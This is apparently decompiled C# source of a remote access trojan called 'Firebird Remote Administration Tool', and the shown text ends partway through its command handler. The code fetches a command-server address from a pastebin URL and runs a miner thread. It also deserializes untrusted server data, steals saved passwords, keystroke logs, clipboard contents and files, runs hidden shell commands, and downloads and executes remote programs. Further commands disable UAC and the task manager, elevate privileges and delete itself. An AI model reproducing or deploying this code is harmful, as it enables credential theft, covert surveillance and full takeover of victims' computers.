using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x02000002 RID: 2
[StandardModule]
internal sealed class Server
{
	// Token: 0x06000002 RID: 2 RVA: 0x000020E0 File Offset: 0x000002E0
	public static void mainfrm()
	{
		Form form = new Form();
		form.Text = "Firebird Remote Administration Tool";
		Form form2 = form;
		Size size = new Size(255, 90);
		form2.Size = size;
		form.FormBorderStyle = FormBorderStyle.Fixed3D;
		form.MaximizeBox = false;
		Label label = new Label();
		label.AutoSize = false;
		Control control = label;
		size = new Size(230, 80);
		control.Size = size;
		label.Text = "Welcome to Firebird! Your system is currently being monitored.";
		Control control2 = label;
		Point location = new Point(10, 10);
		control2.Location = location;
		form.Controls.Add(label);
		form.FormClosing += Server.closemainfrm;
		Application.Run(form);
	}

	// Token: 0x06000003 RID: 3 RVA: 0x00002188 File Offset: 0x00000388
	private static void closemainfrm(object sender, FormClosingEventArgs e)
	{
		Server.endthreads();
		Environment.Exit(0);
	}

	// Token: 0x06000004 RID: 4 RVA: 0x00002198 File Offset: 0x00000398
	[STAThread]
	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	public static void Main()
	{
		try
		{
			Server.DllRes = (byte[])new ResourceManager("Dll", typeof(Server).Assembly).GetObject("Dll");
			Server.objMutex = new Mutex(false, "NGD19");
			if (!Server.objMutex.WaitOne(0, false))
			{
				Server.objMutex.Close();
				Server.objMutex = null;
				ProjectData.EndApp();
			}
			try
			{
			}
			catch (Exception ex)
			{
			}
			Thread thread = new Thread(new ThreadStart(HandleMiner.ManageMiner));
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			Thread thread2 = new Thread(new ThreadStart(Server.Features));
			thread2.SetApartmentState(ApartmentState.STA);
			thread2.Start();
			Thread thread3 = new Thread(new ThreadStart(Server.KillLoop));
			thread3.SetApartmentState(ApartmentState.STA);
			thread3.Start();
			if (Server.logging)
			{
				Thread thread4 = new Thread(new ThreadStart(Clog.Startclogging));
				thread4.SetApartmentState(ApartmentState.STA);
				thread4.Start();
				Thread thread5 = new Thread(new ThreadStart(Clog.Startclogging2));
				thread5.SetApartmentState(ApartmentState.STA);
				thread5.Start();
				if (Server.emaillogs)
				{
					Thread thread6 = new Thread(new ThreadStart(Clog.Email));
					thread6.SetApartmentState(ApartmentState.STA);
					thread6.Start();
					Thread thread7 = new Thread(new ThreadStart(Clog.Email2));
					thread7.SetApartmentState(ApartmentState.STA);
					thread7.Start();
				}
			}
			Server.start();
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00002350 File Offset: 0x00000550
	private static void Features()
	{
		try
		{
			Functions.Unblock();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002384 File Offset: 0x00000584
	private static void KillLoop()
	{
		for (;;)
		{
			try
			{
				Thread.Sleep(1000);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000007 RID: 7 RVA: 0x000023BC File Offset: 0x000005BC
	private static void start()
	{
		for (;;)
		{
			try
			{
				Server.Client = new TcpClient();
				while (!Server.Client.Connected)
				{
					try
					{
						Server.Client.Connect(new StreamReader(new WebClient().OpenRead("https://pastebin.com/raw/03v3hHFA")).ReadToEnd(), 2850);
					}
					catch (Exception ex)
					{
					}
				}
				Server.nstream = Server.Client.GetStream();
				Functions.uploadserialized(Server.nstream, string.Concat(new string[]
				{
					"54321|",
					CultureInfo.CurrentCulture.ToString().Substring(3, 2),
					"|",
					Environment.UserName,
					"|",
					Functions.getOSInfo(),
					"|NGD19|",
					Functions.userrole(),
					""
				}));
				Server.nstream.BeginRead(new byte[]
				{
					0
				}, 0, 0, new AsyncCallback(Server.Read), null);
			}
			catch (Exception ex2)
			{
				continue;
			}
			break;
		}
	}

	// Token: 0x06000008 RID: 8 RVA: 0x000024E8 File Offset: 0x000006E8
	private static void newthreadcheck()
	{
		try
		{
			Server.nstream.BeginRead(new byte[]
			{
				0
			}, 0, 0, new AsyncCallback(Server.Read), null);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000009 RID: 9 RVA: 0x0000253C File Offset: 0x0000073C
	public static void Read(IAsyncResult ar)
	{
		try
		{
			TcpClient client = Server.Client;
			lock (client)
			{
				BinaryFormatter binaryFormatter = new BinaryFormatter();
				binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
				binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
				binaryFormatter.FilterLevel = TypeFilterLevel.Full;
				byte[] array = new byte[8];
				int i = 8;
				int num = 0;
				while (i > 0)
				{
					object obj = Server.nstream.Read(array, num, i);
					if (Operators.ConditionalCompareObjectEqual(obj, 0, false))
					{
						throw new Exception("Disconnected");
					}
					int num2 = Conversions.ToInteger(obj);
					i -= num2;
					num += num2;
				}
				ulong num3 = BitConverter.ToUInt64(array, 0);
				object right = 0;
				byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num3), 1m)) + 1];
				object objectValue2;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					int num4 = 0;
					int j = array2.Length;
					while (j > 0)
					{
						object obj2 = Server.nstream.Read(array2, num4, j);
						if (Operators.ConditionalCompareObjectEqual(obj2, 0, false))
						{
							throw new Exception("Disconnected");
						}
						right = RuntimeHelpers.GetObjectValue(obj2);
						j = Conversions.ToInteger(Operators.SubtractObject(j, right));
						num4 = Conversions.ToInteger(Operators.AddObject(num4, right));
					}
					memoryStream.Write(array2, 0, (int)num3);
					memoryStream.Position = 0L;
					object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
					objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
					memoryStream.Close();
					memoryStream.Dispose();
				}
				Server.HandleData(RuntimeHelpers.GetObjectValue(objectValue2));
				Server.nstream.BeginRead(new byte[]
				{
					0
				}, 0, 0, new AsyncCallback(Server.Read), null);
			}
		}
		catch (Exception ex)
		{
			try
			{
				Server.endthreads();
				Server.start();
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x0600000A RID: 10 RVA: 0x00002794 File Offset: 0x00000994
	public static void HandleData(object data)
	{
		try
		{
			ThreadPool.QueueUserWorkItem(new WaitCallback(Server.runcommandnewt), RuntimeHelpers.GetObjectValue(data));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600000B RID: 11 RVA: 0x000027D8 File Offset: 0x000009D8
	public static void runcommandnewt(object data)
	{
		try
		{
			string expression;
			if (Server.encryptedconnection)
			{
				expression = EncryptionFunctions.PublicDecrypt(Conversions.ToString(data), "chizzy25@", Server.encryptionindex);
			}
			else
			{
				expression = Conversions.ToString(data);
			}
			object obj = Strings.Split(expression, "*", -1, CompareMethod.Text);
			object left = NewLateBinding.LateIndexGet(obj, new object[]
			{
				0
			}, null);
			if (Operators.ConditionalCompareObjectEqual(left, 0, false))
			{
				MessageBoxButtons buttons = (MessageBoxButtons)Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
				{
					3
				}, null));
				MessageBoxIcon icon = (MessageBoxIcon)Conversions.ToInteger(Operators.MultiplyObject(NewLateBinding.LateIndexGet(obj, new object[]
				{
					4
				}, null), 16));
				MessageBox.Show(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
				{
					1
				}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
				{
					2
				}, null)), buttons, icon);
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 1, false))
			{
				object left2 = NewLateBinding.LateIndexGet(obj, new object[]
				{
					1
				}, null);
				if (Operators.ConditionalCompareObjectEqual(left2, 0, false))
				{
					RemoteDesktop.startsc(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left2, 1, false))
				{
					RemoteDesktop.endsc();
				}
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 2, false))
			{
				object left3 = NewLateBinding.LateIndexGet(obj, new object[]
				{
					1
				}, null);
				if (Operators.ConditionalCompareObjectEqual(left3, 0, false))
				{
					if (!Server.webcamenabled)
					{
						Webcam.startcam(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							3
						}, null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
						{
							4
						}, null)));
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left3, 1, false))
				{
					Webcam.endcam();
				}
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 3, false))
			{
				Functions.uploadserialized(Server.nstream, "3|" + InitalizePass.GrabAllPasswords());
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 4, false))
			{
				Functions.uploadserialized(Server.nstream, Operators.ConcatenateObject("4|", Functions.LoadProcesses()));
			}
			else
			{
				if (Operators.ConditionalCompareObjectEqual(left, 5, false))
				{
					try
					{
						Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null).ToString())).Kill();
						return;
					}
					catch (Exception ex)
					{
						return;
					}
				}
				if (Operators.ConditionalCompareObjectEqual(left, 6, false))
				{
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(obj, new object[]
					{
						0
					}, null), 6, false))
					{
						Interaction.Shell("cmd.exe /c start " + NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null).ToString(), AppWinStyle.Hide, false, -1);
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 7, false))
				{
					if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null), null, "Contains", new object[]
					{
						"Null"
					}, null, null, null)))
					{
						Functions.uploadserialized(Server.nstream, Operators.ConcatenateObject("7Null|", Functions.ReturnDrives()));
					}
					else
					{
						Functions.uploadserialized(Server.nstream, Operators.ConcatenateObject("7|", Functions.ReturnFiles(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null)))));
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8, false))
				{
					Directory.CreateDirectory(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null).ToString());
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 9, false))
				{
					Process.Start(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null).ToString());
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 10, false))
				{
					File.Delete(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null).ToString());
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 11, false))
				{
					Functions.uploadserialized(Server.nstream, "CopyTo|" + Convert.ToBase64String(File.ReadAllBytes(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)))));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 12, false))
				{
					Functions.WriteBytes(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)), Convert.FromBase64String(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						2
					}, null))));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 13, false))
				{
					Functions.uploadserialized(Server.nstream, "13|" + Clog.logs.ToString());
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 14, false))
				{
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null), 0, false))
					{
						Server.chatthread = new Thread(new ThreadStart(Functions.showchatter));
						Server.chatthread.SetApartmentState(ApartmentState.STA);
						Server.chatthread.Start();
						while (!Functions.chatter.Visible)
						{
							Functions.chatter.Activate();
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null), 1, false))
					{
						try
						{
							Functions.chatter.Close();
						}
						catch (Exception ex2)
						{
						}
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 15, false))
				{
					Functions.addchat(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 16, false))
				{
					Functions.ElevateSelf();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 17, false))
				{
					object left4 = NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null);
					if (Operators.ConditionalCompareObjectEqual(left4, 0, false))
					{
						if (File.Exists(Interaction.Environ("temp") + "\\runbat.bat"))
						{
							File.Delete(Interaction.Environ("temp") + "\\runbat.bat");
						}
						TextWriter textWriter = new StreamWriter(Interaction.Environ("temp") + "\\runbat.bat");
						textWriter.Write(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)));
						textWriter.Close();
						Process.Start("explorer.exe", Interaction.Environ("temp") + "\\runbat.bat");
						if (File.Exists(Interaction.Environ("temp") + "\\runvbs.vbs"))
						{
							File.Delete(Interaction.Environ("temp") + "\\runvbs.vbs");
						}
						TextWriter textWriter2 = new StreamWriter(Interaction.Environ("temp") + "\\runvbs.vbs");
						textWriter2.Write(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
						{
							3
						}, null)));
						textWriter2.Close();
						Process.Start("explorer.exe", Interaction.Environ("temp") + "\\runvbs.vbs");
					}
					else if (Operators.ConditionalCompareObjectEqual(left4, 1, false))
					{
						if (File.Exists(Interaction.Environ("temp") + "\\runbat.bat"))
						{
							File.Delete(Interaction.Environ("temp") + "\\runbat.bat");
						}
						TextWriter textWriter3 = new StreamWriter(Interaction.Environ("temp") + "\\runbat.bat");
						textWriter3.Write(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)));
						textWriter3.Close();
						Process.Start("explorer.exe", Interaction.Environ("temp") + "\\runbat.bat");
					}
					else if (Operators.ConditionalCompareObjectEqual(left4, 2, false))
					{
						if (File.Exists(Interaction.Environ("temp") + "\\runvbs.vbs"))
						{
							File.Delete(Interaction.Environ("temp") + "\\runvbs.vbs");
						}
						TextWriter textWriter4 = new StreamWriter(Interaction.Environ("temp") + "\\runvbs.vbs");
						textWriter4.Write(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)));
						textWriter4.Close();
						Process.Start("explorer.exe", Interaction.Environ("temp") + "\\runvbs.vbs");
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 18, false))
				{
					object instance = null;
					Type typeFromHandle = typeof(Process);
					string memberName = "Start";
					object[] array = new object[1];
					object[] array2 = array;
					int num = 0;
					object instance2 = obj;
					object[] array3 = new object[1];
					object[] array4 = array3;
					int num2 = 0;
					int num3 = 1;
					array4[num2] = num3;
					array2[num] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(instance2, array3, null));
					object[] array5 = array;
					object[] arguments = array5;
					string[] argumentNames = null;
					Type[] typeArguments = null;
					bool[] array6 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array6, true);
					if (array6[0])
					{
						NewLateBinding.LateIndexSetComplex(obj, new object[]
						{
							num3,
							RuntimeHelpers.GetObjectValue(array5[0])
						}, null, true, false);
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 19, false))
				{
					Interaction.Shell("Shutdown -r -f", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 20, false))
				{
					Interaction.Shell("Shutdown -s -f", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 21, false))
				{
					Interaction.Shell("Shutdown -l -f", AppWinStyle.Hide, false, -1);
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 22, false))
				{
					Functions.WriteBytes(Conversions.ToString(Operators.ConcatenateObject(Interaction.Environ("localappdata") + "\\", NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null))), Convert.FromBase64String(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						2
					}, null))));
					NewLateBinding.LateCall(null, typeof(Process), "Start", new object[]
					{
						Operators.ConcatenateObject(Interaction.Environ("localappdata") + "\\", NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null))
					}, null, null, null, true);
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 23, false))
				{
					Functions.URLDownloadToFile(null, Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)), Interaction.Environ("localappdata") + "\\URLDL.exe", 0, IntPtr.Zero);
					Process.Start(Interaction.Environ("localappdata") + "\\URLDL.exe");
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 24, false))
				{
					Server.objMutex.Close();
					Server.objMutex = null;
					Functions.WriteBytes(Conversions.ToString(Operators.ConcatenateObject(Interaction.Environ("localappdata") + "\\", NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null))), Convert.FromBase64String(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						2
					}, null))));
					NewLateBinding.LateCall(null, typeof(Process), "Start", new object[]
					{
						Operators.ConcatenateObject(Interaction.Environ("localappdata") + "\\", NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null))
					}, null, null, null, true);
					if (Conversions.ToBoolean(Functions.IsFileOpen(new FileInfo(Conversions.ToString(Operators.ConcatenateObject(Interaction.Environ("localappdata") + "\\", NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)))))))
					{
						Functions.Melt();
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 25, false))
				{
					Server.objMutex.Close();
					Server.objMutex = null;
					if (File.Exists(Interaction.Environ("localappdata") + "\\URLUP.exe"))
					{
						File.Delete(Interaction.Environ("localappdata") + "\\URLUP.exe");
					}
					Functions.URLDownloadToFile(null, Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)), Interaction.Environ("localappdata") + "\\URLUP.exe", 0, IntPtr.Zero);
					Process.Start(Interaction.Environ("localappdata") + "\\URLUP.exe");
					if (Conversions.ToBoolean(Functions.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\URLUP.exe"))))
					{
						Functions.Melt();
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 26, false))
				{
					Functions.Melt();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 27, false))
				{
					Process.GetCurrentProcess().Kill();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 28, false))
				{
					Functions.uploadserialized(Server.nstream, "28|" + Clog.GetClipboard());
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 29, false))
				{
					CMD.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 30, false))
				{
					CMD.Write(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 31, false))
				{
					CMD.Close();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 32, false))
				{
					Functions.uploadserialized(Server.nstream, "32|" + HandleRegistry.ReturnRegistry(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						2
					}, null))));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 33, false))
				{
					Functions.uploadserialized(Server.nstream, Operators.ConcatenateObject("33|", TCPGet.TCPString()));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 34, false))
				{
					object left5 = NewLateBinding.LateIndexGet(obj, new object[]
					{
						3
					}, null);
					if (Operators.ConditionalCompareObjectEqual(left5, 0, false))
					{
						Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)));
						Cursor.Position = position;
						Functions.mouse_event(2u, 0u, 0u, 0u, 0);
					}
					else if (Operators.ConditionalCompareObjectEqual(left5, 1, false))
					{
						Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
						{
							2
						}, null)));
						Cursor.Position = position;
						Functions.mouse_event(8u, 0u, 0u, 0u, 0);
						Functions.mouse_event(16u, 0u, 0u, 0u, 0);
					}
					else if (Operators.ConditionalCompareObjectEqual(left5, 2, false))
					{
						Functions.mouse_event(4u, 0u, 0u, 0u, 0);
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 35, false))
				{
					SendKeys.SendWait(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 36, false))
				{
					Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
					{
						2
					}, null)));
					Cursor.Position = position;
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 37, false))
				{
					Dictionary<string, List<Size>> dictionary = (Dictionary<string, List<Size>>)AppDomain.CurrentDomain.Load(Server.DllRes).GetType("Firebird.CommandHandler").GetMethod("HandleGetWebcams").Invoke(AppDomain.CurrentDomain.Load(Server.DllRes).GetType("Firebird.CommandHandler"), null);
					object obj2 = "37|";
					try
					{
						foreach (KeyValuePair<string, List<Size>> keyValuePair in dictionary)
						{
							obj2 = Operators.ConcatenateObject(obj2, keyValuePair.Key + "◆");
							int num4 = 0;
							int num5 = keyValuePair.Value.ToArray().Length - 1;
							for (int i = num4; i <= num5; i++)
							{
								obj2 = Operators.ConcatenateObject(obj2, keyValuePair.Value.ToArray().GetValue(i).ToString());
								if (i != keyValuePair.Value.ToArray().Length - 1)
								{
									obj2 = Operators.ConcatenateObject(obj2, "◆");
								}
							}
							obj2 = Operators.ConcatenateObject(obj2, "◇");
						}
					}
					finally
					{
						Dictionary<string, List<Size>>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					Functions.uploadserialized(Server.nstream, RuntimeHelpers.GetObjectValue(obj2));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 38, false))
				{
					Functions.GeoLocate();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 39, false))
				{
					object left6 = NewLateBinding.LateIndexGet(obj, new object[]
					{
						1
					}, null);
					if (Operators.ConditionalCompareObjectEqual(left6, 0, false))
					{
						Functions.monitoron(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 1, false))
					{
						Functions.monitoron(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 2, false))
					{
						Functions.opencd(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 3, false))
					{
						Functions.opencd(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 4, false))
					{
						Functions.showtaskbar(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 5, false))
					{
						Functions.showtaskbar(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 6, false))
					{
						Functions.showstartbtn(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 7, false))
					{
						Functions.showstartbtn(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 8, false))
					{
						Functions.startexplorer(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 9, false))
					{
						Functions.startexplorer(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 10, false))
					{
						Functions.showclock(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 11, false))
					{
						Functions.showclock(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 12, false))
					{
						Functions.showtray(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 13, false))
					{
						Functions.showtray(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 14, false))
					{
						Functions.showdesktopico(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 15, false))
					{
						Functions.showdesktopico(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 16, false))
					{
						Functions.hideallwindows();
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 17, false))
					{
						Functions.enabletaskmgr(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 18, false))
					{
						Functions.enabletaskmgr(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 19, false))
					{
						Functions.enableregedit(true);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 20, false))
					{
						Functions.enableregedit(false);
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 21, false))
					{
						Server.mousethread.Abort();
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 22, false))
					{
						Server.mousethread = new Thread(new ThreadStart(Functions.showmouse));
						Server.mousethread.SetApartmentState(ApartmentState.STA);
						Server.mousethread.Start();
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 23, false))
					{
						Functions.disableuac();
					}
					else if (Operators.ConditionalCompareObjectEqual(left6, 24, false))
					{
						new PrintClass
						{
							PrintVar = Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
							{
								2
							}, null))
						}.Print();
					}
				}
				else
				{
					if (Operators.ConditionalCompareObjectEqual(left, 40, false))
					{
						try
						{
							Console.Beep(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								1
							}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								2
							}, null)));
							return;
						}
						catch (Exception ex3)
						{
							return;
						}
					}
					if (Operators.ConditionalCompareObjectEqual(left, 41, false))
					{
						try
						{
							Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
							{
								1
							}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
							{
								2
							}, null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(obj, new object[]
							{
								3
							}, null)), (RegistryValueKind)Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								4
							}, null)));
							return;
						}
						catch (Exception ex4)
						{
							return;
						}
					}
					if (Operators.ConditionalCompareObjectEqual(left, 42, false))
					{
						try
						{
							switch (Conversions.ToInteger(NewLateBinding.LateIndexGet(obj, new object[]
							{
								1
							}, null)))
							{
							case 0:
								Registry.CurrentUser.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)));
								break;
							case 1:
								Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)), "", RegistryValueKind.String);
								break;
							case 2:
								Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)), new byte[0], RegistryValueKind.Binary);
								break;
							case 3:
								Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)), 0, RegistryValueKind.DWord);
								break;
							case 4:
								Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)), 0, RegistryValueKind.QWord);
								break;
							case 5:
								Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)), new string[0], RegistryValueKind.MultiString);
								break;
							case 6:
								Registry.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)), "", RegistryValueKind.ExpandString);
								break;
							case 7:
								Registry.CurrentUser.OpenSubKey(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									2
								}, null)), true).DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
								{
									3
								}, null)));
								break;
							}
						}
						catch (Exception ex5)
						{
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 43, false))
					{
						File.WriteAllText(Interaction.Environ("localappdata") + "\\MSettings", Conversions.ToString(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 44, false))
					{
						Process.Start(NewLateBinding.LateIndexGet(obj, new object[]
						{
							1
						}, null).ToString());
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 45, false))
					{
						if (File.Exists(Interaction.Environ("localappdata") + "\\MSettings"))
						{
							Functions.uploadserialized(Server.nstream, "45|" + File.ReadAllText(Interaction.Environ("localappdata") + "\\MSettings"));
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 46, false))
					{
